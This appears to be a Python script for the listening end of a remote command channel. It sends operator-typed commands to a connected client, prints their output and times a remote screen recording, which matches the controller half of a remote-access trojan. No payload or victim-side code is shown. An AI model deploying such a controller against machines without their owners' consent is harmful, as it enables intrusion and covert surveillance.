import socket
import time


class Server:
    def __init__(self):
        self.server_ip_address = '127.0.0.1'
        self.server_port = 9999

    def run(self):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.bind((self.server_ip_address, self.server_port))

                print('\nWaiting for connection to establish...\n')
                server_socket.listen(3)

                client_socket, client_ip_port = server_socket.accept()

                print('Connection established with:-')
                print(f'Ip4 address: {client_ip_port[0]}')
                print(f'Port: {client_ip_port[1]}')

                while True:
                    command = input('\nEnter the command to send: ').strip()
                    if command == '':  # if no command entered
                        continue
                    if command == 'exit':
                        print('[CONNECTION TERMINATED SUCCESSFULLY]')
                        break

                    client_socket.send(command.encode('utf-8'))

                    data = client_socket.recv(204800).decode()
                    if data == '[SCREEN RECORDING STARTED...]':
                        print(data)
                        print(Server.recording_time(command.split(' ')[1]))
                        continue
                    if data == 'Connection closed':
                        print('[CONNECTION TERMINATED SUCCESSFULLY]')
                        break
                    if len(data) > 0:  # means if we get something in return then print it to screen eg. by dir command
                        print(data)
        except ConnectionAbortedError as msg:
            print(msg)
        except OSError as msg:  # if client forcefully close the connection then server again start listening for connections
            print(msg)
            self.run()
        except Exception as msg:
            print(msg)

    @classmethod
    def recording_time(cls, stop):
        stop = int(stop)
        start = time.time()
        while True:
            end = time.time()
            if end - start >= stop:
                break
            else:
                continue
        return '[SCREEN RECORDING FINISHED]'


obj = Server()
obj.run()
